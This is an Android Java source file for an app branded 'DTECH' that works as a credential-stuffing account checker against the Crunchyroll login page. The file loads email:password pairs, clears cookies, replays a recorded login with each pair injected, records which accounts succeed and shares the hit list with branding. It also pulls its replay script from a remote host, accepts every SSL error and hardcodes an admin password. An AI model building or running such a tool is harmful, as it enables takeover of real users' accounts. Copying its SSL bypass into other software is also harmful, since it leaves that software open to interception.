package com.dtech.automation;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.http.SslError;
import android.os.Bundle;
import android.util.Log;
import android.webkit.JavascriptInterface;
import android.webkit.SslErrorHandler;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

public class MainActivity extends Activity {

    private static final String TAG = "WebAutomation";
    private WebView mWebView;
    private final String mainUrl = "https://sso.crunchyroll.com/login";
    private Button btnRecord, btnStop, btnPlay, btnSettings, btnResults, btnExportScript;

    private boolean isRecording = false;
    private boolean isReplaying = false;
    private long recordingStartTime = 0;
    private long replayStartTime = 0;
    private int lastExecutedIndex = -1;

    // Batch Execution State
    private List<String> credentialList = new ArrayList<>();
    private int currentCredentialIndex = 0;
    private boolean isBatchRunning = false;
    private int verificationAttempts = 0;
    private static final int MAX_VERIFICATION_ATTEMPTS = 15; // ~30 seconds

    // We store events in a synchronized list to handle multi-threaded access from Bridge
    private List<JSONObject> currentSessionEvents = Collections.synchronizedList(new ArrayList<>());

    private static final String PREFS_NAME = "AutomationPrefs";
    private static final String KEY_EVENTS = "saved_events";

    @SuppressLint("SetJavaScriptEnabled")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        mWebView = findViewById(R.id.activity_main_webview);
        btnRecord = findViewById(R.id.btn_record);
        btnStop = findViewById(R.id.btn_stop);
        btnPlay = findViewById(R.id.btn_play);
        btnSettings = findViewById(R.id.btn_settings);
        btnResults = findViewById(R.id.btn_results);
        btnExportScript = findViewById(R.id.btn_export_script);

        setupWebView();
        setupButtons();

        loadSavedEvents();
        fetchRemoteScript();

        if (isConnected()) {
            mWebView.loadUrl(mainUrl);
        } else {
            showOfflineDialog();
        }
    }

    private void fetchRemoteScript() {
        new Thread(() -> {
            try {
                java.net.URL url = new java.net.URL("https://www.preasx24.co.za/navigation.json");
                java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);
                conn.setRequestMethod("GET");

                if (conn.getResponseCode() == 200) {
                    BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                    StringBuilder sb = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {
                        sb.append(line);
                    }
                    reader.close();

                    String jsonResponse = sb.toString();
                    // Validate JSON
                    JSONArray jsonArray = new JSONArray(jsonResponse);

                    // Save and Update
                    runOnUiThread(() -> {
                        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
                        prefs.edit().putString(KEY_EVENTS, jsonResponse).apply();

                        // Update memory
                        currentSessionEvents.clear();
                        try {
                            for (int i = 0; i < jsonArray.length(); i++) {
                                currentSessionEvents.add(jsonArray.getJSONObject(i));
                            }
                            Log.i(TAG, "Remote script fetched and updated: " + currentSessionEvents.size() + " events");
                        } catch (JSONException e) {
                            Log.e(TAG, "Error updating memory from remote", e);
                        }
                    });
                } else {
                    Log.e(TAG, "Remote fetch failed: " + conn.getResponseCode());
                }
            } catch (Exception e) {
                Log.e(TAG, "Error fetching remote script", e);
            }
        }).start();
    }

    private void setupWebView() {
        WebSettings webSettings = mWebView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webSettings.setAllowFileAccess(true);
        webSettings.setAllowContentAccess(true);
        webSettings.setDomStorageEnabled(true);
        webSettings.setDatabaseEnabled(true);

        mWebView.addJavascriptInterface(new WebAppInterface(this), "Android");

        mWebView.setWebViewClient(new WebViewClient() {
            @Override
            public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
                handler.proceed();
            }

            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                return false;
            }

            @Override
            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                return false;
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                Log.d(TAG, "Page loaded: " + url);

                if (isRecording) {
                    injectRecorder();
                } else if (isReplaying) {
                    injectReplayer();
                }
            }
        });
    }

    private void setupButtons() {
        // Default State: Hide Admin Controls
        btnRecord.setVisibility(android.view.View.GONE);
        btnStop.setVisibility(android.view.View.GONE);
        btnExportScript.setVisibility(android.view.View.GONE);

        btnRecord.setOnClickListener(v -> startRecording());
        btnStop.setOnClickListener(v -> stopRecording());
        btnPlay.setOnClickListener(v -> startBatchReplay());
        btnSettings.setOnClickListener(v -> startActivity(new android.content.Intent(this, SettingsActivity.class)));
        btnSettings.setOnLongClickListener(v -> {
            showAdminLoginDialog();
            return true;
        });
        btnResults.setOnClickListener(v -> showBatchResults());
        btnExportScript.setOnClickListener(v -> exportCurrentScript());
    }

    private void showAdminLoginDialog() {
        android.view.View dialogView = android.view.LayoutInflater.from(this).inflate(R.layout.dialog_admin_login, null);
        android.widget.EditText etUser = dialogView.findViewById(R.id.et_username);
        android.widget.EditText etPass = dialogView.findViewById(R.id.et_password);

        new AlertDialog.Builder(this)
            .setTitle("Admin Login")
            .setView(dialogView)
            .setPositiveButton("Login", (dialog, which) -> {
                String user = etUser.getText().toString();
                String pass = etPass.getText().toString();
                if ("admin".equals(user) && "preasx24".equals(pass)) {
                    enableAdminMode();
                } else {
                    Toast.makeText(this, "Invalid Credentials", Toast.LENGTH_SHORT).show();
                }
            })
            .setNegativeButton("Cancel", null)
            .show();
    }

    private void enableAdminMode() {
        btnRecord.setVisibility(android.view.View.VISIBLE);
        btnStop.setVisibility(android.view.View.VISIBLE);
        btnExportScript.setVisibility(android.view.View.VISIBLE);
        Toast.makeText(this, "Admin Mode Enabled", Toast.LENGTH_SHORT).show();
    }

    private void exportCurrentScript() {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        String jsonString = prefs.getString(KEY_EVENTS, "[]");

        android.content.Intent sendIntent = new android.content.Intent();
        sendIntent.setAction(android.content.Intent.ACTION_SEND);
        sendIntent.putExtra(android.content.Intent.EXTRA_TEXT, jsonString);
        sendIntent.setType("text/plain");

        android.content.Intent shareIntent = android.content.Intent.createChooser(sendIntent, "Export Navigation JSON");
        startActivity(shareIntent);
    }

    private void startRecording() {
        isRecording = true;
        isReplaying = false;
        recordingStartTime = System.currentTimeMillis();
        currentSessionEvents.clear(); // Start fresh

        Toast.makeText(this, "Recording Started", Toast.LENGTH_SHORT).show();
        injectRecorder();
    }

    private void stopRecording() {
        if (!isRecording) return;
        isRecording = false;
        saveSessionToPrefs();
        Toast.makeText(this, "Stopped & Saved " + currentSessionEvents.size() + " events", Toast.LENGTH_SHORT).show();
    }

    private void startBatchReplay() {
        if (currentSessionEvents.isEmpty()) {
            Toast.makeText(this, "No saved session to replay. Record one first.", Toast.LENGTH_SHORT).show();
            return;
        }

        // Load credentials
        SharedPreferences prefs = getSharedPreferences(SettingsActivity.PREFS_NAME, MODE_PRIVATE);
        String creds = prefs.getString(SettingsActivity.KEY_CREDENTIALS, "");
        if (creds.isEmpty()) {
            Toast.makeText(this, "No credentials found. Check Settings.", Toast.LENGTH_SHORT).show();
            return;
        }

        credentialList.clear();
        String[] lines = creds.split("\n");
        for (String line : lines) {
            if (line.contains(":")) {
                credentialList.add(line.trim());
            }
        }

        if (credentialList.isEmpty()) {
            Toast.makeText(this, "No valid credentials parsed.", Toast.LENGTH_SHORT).show();
            return;
        }

        isRecording = false;
        isReplaying = true;
        isBatchRunning = true;
        currentCredentialIndex = 0;

        Toast.makeText(this, "Starting Batch Replay: " + credentialList.size() + " accounts", Toast.LENGTH_SHORT).show();
        processNextCredential();
    }

    private void processNextCredential() {
        if (currentCredentialIndex >= credentialList.size()) {
            isBatchRunning = false;
            isReplaying = false;
            runOnUiThread(() -> new AlertDialog.Builder(MainActivity.this)
                .setTitle("Batch Complete")
                .setMessage("Processed all accounts.")
                .setPositiveButton("OK", null)
                .show());
            return;
        }

        String currentPair = credentialList.get(currentCredentialIndex);
        Log.d(TAG, "Processing: " + currentPair);

        // Clear cookies to ensure fresh login
        android.webkit.CookieManager.getInstance().removeAllCookies(null);
        android.webkit.WebStorage.getInstance().deleteAllData();

        replayStartTime = System.currentTimeMillis();
        lastExecutedIndex = -1;

        // Ensure we are on the correct URL before injecting anything
        if (!mWebView.getUrl().startsWith(mainUrl)) {
            Log.d(TAG, "Not on login page, reloading...");
            mWebView.loadUrl(mainUrl);
            // The onPageFinished listener will trigger injectReplayer when done
        } else {
             // Already on page, force reload to be safe or just start?
             // User requested "reload sounds good", so let's reload.
             mWebView.loadUrl(mainUrl);
        }
    }

    private void injectRecorder() {
        Log.d(TAG, "Injecting Recorder Script");
        String js = readAssetFile("recorder.js");
        // Inject start time variable first
        String setup = "window.recordingStartTime = " + recordingStartTime + ";";
        mWebView.evaluateJavascript(setup + js, null);
    }

    private void injectReplayer() {
        Log.d(TAG, "Injecting Replayer Script");
        String js = readAssetFile("replayer.js");

        verificationAttempts = 0;

        // Get current credentials
        String email = "";
        String pass = "";
        if (isBatchRunning && currentCredentialIndex < credentialList.size()) {
            String[] parts = credentialList.get(currentCredentialIndex).split(":", 2);
            if (parts.length > 0) email = parts[0].trim();
            if (parts.length > 1) pass = parts[1].trim();
        }

        // Convert list to JSON string
        JSONArray jsonArray = new JSONArray(currentSessionEvents);
        String eventsJson = jsonArray.toString();

        // Use JSON object for overrides to avoid escaping issues
        JSONObject overrides = new JSONObject();
        try {
            overrides.put("email", email);
            overrides.put("password", pass);
        } catch (JSONException e) {
            Log.e(TAG, "Error creating override JSON", e);
        }

        // Inject events, start time, and progress
        String setup = "window.replayEvents = " + eventsJson + "; " +
                       "window.replayStartTime = " + replayStartTime + "; " +
                       "window.lastExecutedIndex = " + lastExecutedIndex + "; " +
                       "var overrides = " + overrides.toString() + "; " +
                       "window.overrideEmail = overrides.email; " +
                       "window.overridePassword = overrides.password;";

        mWebView.evaluateJavascript(setup + js, null);

        // Start checking for results after the estimated replay duration
        long replayDuration = 0;
        if (!currentSessionEvents.isEmpty()) {
            try {
                JSONObject last = currentSessionEvents.get(currentSessionEvents.size() - 1);
                replayDuration = last.getLong("time");
            } catch (JSONException e) {}
        }

        // Wait at least the replay duration + 5 seconds for network
        mWebView.postDelayed(this::checkVerificationStatus, replayDuration + 5000);
    }

    private void checkVerificationStatus() {
        if (!isBatchRunning) return;

        if (verificationAttempts >= MAX_VERIFICATION_ATTEMPTS) {
            logResult(false, "Timeout waiting for result");
            moveToNext();
            return;
        }
        verificationAttempts++;

        String js = readAssetFile("verifier.js");
        mWebView.evaluateJavascript(js, value -> {
            // Value is returned as a JSON string wrapped in quotes, e.g. "{\"status\":\"success\"}"
            // Android adds extra quotes around the return value of evaluateJavascript
            if (value != null && value.length() > 2) {
                 // Clean up the string (remove surrounding quotes if present)
                 String jsonStr = value;
                 if (jsonStr.startsWith("\"") && jsonStr.endsWith("\"")) {
                     jsonStr = jsonStr.substring(1, jsonStr.length() - 1);
                     // Unescape escaped quotes
                     jsonStr = jsonStr.replace("\\\"", "\"");
                 }

                 try {
                     JSONObject res = new JSONObject(jsonStr);
                     String status = res.getString("status");

                     if ("success".equals(status)) {
                         logResult(true, res.optString("detail"));
                         moveToNext();
                     } else if ("failure".equals(status)) {
                         logResult(false, res.optString("detail"));
                         moveToNext();
                     } else {
                         // Still pending, check again in 2 seconds
                         Log.d(TAG, "Verification pending: " + res.optString("detail"));
                         mWebView.postDelayed(this::checkVerificationStatus, 2000);
                     }
                 } catch (JSONException e) {
                     Log.e(TAG, "Error parsing verification result: " + value, e);
                     // If we can't parse, assume pending or error, try again briefly or fail
                     mWebView.postDelayed(this::checkVerificationStatus, 2000);
                 }
            } else {
                mWebView.postDelayed(this::checkVerificationStatus, 2000);
            }
        });
    }

    private void logResult(boolean success, String detail) {
        String cred = credentialList.get(currentCredentialIndex);
        String msg = (success ? "SUCCESS" : "FAIL") + ": " + cred.split(":")[0] + " (" + detail + ")";
        Log.i(TAG, "Batch Result: " + msg);
        runOnUiThread(() -> Toast.makeText(this, msg, Toast.LENGTH_SHORT).show());
        saveResultToFile(msg);
    }

    private void saveResultToFile(String resultLine) {
        try {
            java.io.FileOutputStream fos = openFileOutput("batch_results.txt", MODE_APPEND);
            fos.write((resultLine + "\n").getBytes());
            fos.close();
        } catch (IOException e) {
            Log.e(TAG, "Failed to save result", e);
        }
    }

    private void showBatchResults() {
        try {
            java.io.FileInputStream fis = openFileInput("batch_results.txt");
            BufferedReader reader = new BufferedReader(new InputStreamReader(fis));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                sb.append(line).append("\n");
            }
            reader.close();

            String results = sb.toString();
            new AlertDialog.Builder(this)
                .setTitle("Batch Results")
                .setMessage(results.length() > 0 ? results : "No results yet.")
                .setPositiveButton("OK", null)
                .setNeutralButton("Clear", (d, w) -> deleteFile("batch_results.txt"))
                .setNegativeButton("Share", (d, w) -> shareResults(results))
                .show();

        } catch (IOException e) {
            Toast.makeText(this, "No results found.", Toast.LENGTH_SHORT).show();
        }
    }

    private void shareResults(String results) {
        if (results == null || results.isEmpty()) {
            Toast.makeText(this, "Nothing to share", Toast.LENGTH_SHORT).show();
            return;
        }

        StringBuilder finalOutput = new StringBuilder();
        finalOutput.append(results);
        finalOutput.append("\n\nPOWERED BY DTECH\n");
        finalOutput.append("@PREASX24");

        android.content.Intent sendIntent = new android.content.Intent();
        sendIntent.setAction(android.content.Intent.ACTION_SEND);
        sendIntent.putExtra(android.content.Intent.EXTRA_TEXT, finalOutput.toString());
        sendIntent.setType("text/plain");

        startActivity(android.content.Intent.createChooser(sendIntent, "Share Results"));
    }

    private void moveToNext() {
        currentCredentialIndex++;
        mWebView.postDelayed(this::processNextCredential, 1000);
    }

    private void saveSessionToPrefs() {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        SharedPreferences.Editor editor = prefs.edit();
        JSONArray jsonArray = new JSONArray(currentSessionEvents);
        editor.putString(KEY_EVENTS, jsonArray.toString());
        editor.apply();
    }

    private void loadSavedEvents() {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        String jsonString = prefs.getString(KEY_EVENTS, "[]");
        try {
            JSONArray jsonArray = new JSONArray(jsonString);
            currentSessionEvents.clear();
            for (int i = 0; i < jsonArray.length(); i++) {
                currentSessionEvents.add(jsonArray.getJSONObject(i));
            }
        } catch (JSONException e) {
            Log.e(TAG, "Error loading events", e);
        }
    }

    private String readAssetFile(String fileName) {
        try {
            InputStream is = getAssets().open(fileName);
            BufferedReader reader = new BufferedReader(new InputStreamReader(is));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                sb.append(line).append("\n");
            }
            return sb.toString();
        } catch (IOException e) {
            Log.e(TAG, "Error reading asset: " + fileName, e);
            return "";
        }
    }

    @Override
    public void onBackPressed() {
        if (mWebView.canGoBack()) {
            mWebView.goBack();
        } else {
            super.onBackPressed();
        }
    }

    private void showOfflineDialog() {
        new AlertDialog.Builder(this)
            .setTitle("No Internet Connection")
            .setMessage("Please check your internet connection and restart the app.")
            .setCancelable(false)
            .setPositiveButton("Exit", (dialog, which) -> finish())
            .show();
    }

    private boolean isConnected() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
        NetworkInfo netInfo = cm.getActiveNetworkInfo();
        return netInfo != null && netInfo.isConnected();
    }

    public class WebAppInterface {
        Context mContext;

        WebAppInterface(Context c) {
            mContext = c;
        }

        @JavascriptInterface
        public void showAd(String url) {
           // Kept for backward compatibility
        }

        @JavascriptInterface
        public void saveSession(String jsonString) {
           // Deprecated: We now stream events. Keeping empty stub just in case of old cache.
        }

        @JavascriptInterface
        public void recordEvent(String eventJson) {
            try {
                JSONObject event = new JSONObject(eventJson);
                currentSessionEvents.add(event);
                Log.d(TAG, "Recorded event: " + event.getString("type"));
            } catch (JSONException e) {
                Log.e(TAG, "Failed to parse event", e);
            }
        }

        @JavascriptInterface
        public void eventExecuted(int index) {
            if (index > lastExecutedIndex) {
                lastExecutedIndex = index;
                Log.d(TAG, "Executed event index: " + index);
            }
        }
    }
}
